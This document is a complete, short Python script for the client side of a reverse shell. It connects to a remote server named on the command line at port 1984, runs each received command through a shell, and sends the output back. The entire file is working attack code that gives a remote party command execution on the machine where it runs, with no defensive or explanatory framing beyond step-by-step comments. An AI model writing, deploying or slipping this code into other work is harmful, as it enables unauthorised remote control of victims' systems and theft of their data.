import socket
import subprocess
import sys

SERVER_HOST = sys.argv[1]
SERVER_PORT = 1984
BUFFER_SIZE = 1024

# create the socket object
s = socket.socket()
# connect to the server
s.connect((SERVER_HOST, SERVER_PORT))

while True:
    # receive the command from the server
    command = s.recv(BUFFER_SIZE).decode()
    print(command)
    if command.lower() == "exit":
        # if the command is exit, just break out of the loop
        break
    # execute the command and retrieve the results
    try:
        output = subprocess.check_output(command.split(" "), shell=True,stderr=subprocess.STDOUT)
        s.send(output)
    except Exception as e:
        s.send(e.output)
        
# close client connection
s.close()